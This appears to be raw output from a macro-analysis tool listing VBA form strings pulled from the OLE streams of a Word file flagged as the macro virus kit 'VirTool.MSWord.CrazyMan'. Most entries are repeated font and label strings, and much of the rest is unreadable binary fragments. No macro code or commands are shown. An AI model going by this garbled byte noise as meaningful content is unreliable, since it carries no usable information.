- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OptionDay
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OptionDay
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OptionDay
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OptionDay
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OptionDay
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OptionDay
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OptionDay
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OptionDay
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OptionDay
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OptionDay
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OptionDay
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OptionDay
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OptionDay
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OptionDay
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OptionDay
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OptionDay
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OptionDay
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OptionDay
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OptionDay
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OptionDay
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OptionDay
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OptionDay
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OptionDay
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OptionDay
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OptionDay
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OptionDay
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OptionDay
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OptionDay
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OptionDay
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
My%W�Bl�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Jk*n�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]�$f�2g�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'XB��(y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e�@z�#Gu
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5e	5tD��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g�*b�.n�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o�9��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
L�/?jDIj
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@;��0��,��7��2��%��!��;��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S�!M�$T�0Nq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Lm�2\�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U�)�6��2��?��/��5��4��A��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D�5i�Hr�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=`m4r�0X�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J�)Q�&X�!\�@x�Cv�-q�;~�2n�%O�,E�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G�:q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B~�.��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?�Lt�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P�*M�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;�1U�'L�'L�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?�5Q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\�9a�(O�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n�#b�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U�(a�1l�(g�"Q�/[�5c�4h�'b�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T�r��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P�0l�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
vMb�V��\��U��\��S��=��O��D��N��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X�&3}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z�py�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V��3�B��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.�K��L��S��S��U��\��^��[��Mu�1V�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%�	2�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y�fz�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1{�2��6��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I�Fp�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r=[�[{�`��`��e��G_�:P�9K�?Q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F�Y��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1��$��(n�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O�1g�>k�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�(E�3a�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7�?}�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��"��,q�C�1p�)l�$R�!N�5e�+b�0m�9c�&J�#F�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G�9n�*n�(T�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a�b��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K��-��*��9��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$w2q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p�'g�(l�2x�2y�F��<h�"S�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P�<u�3k�&v�$`�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A�&e�Hy�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B��+q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?A��(|�)��4��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�5u�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r�'i�@�� f�&i�L��P��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\�"k�A��6w�)v�'^�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A�0o�.n�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"]3Q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b��"p�?��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_�"y�/��,��4��%X�9x�6��,w�5��3w�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\�*d�/p�G��/��7��4��%i�.Z� K�/z�+z�0p�S��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Cy� e�-��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u�-��(��-��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r�1i�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T�+��(��/��1w�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T�$Y�&k�B��+��5��/��'l� O�._�#w�-��9��9�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=z�H|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
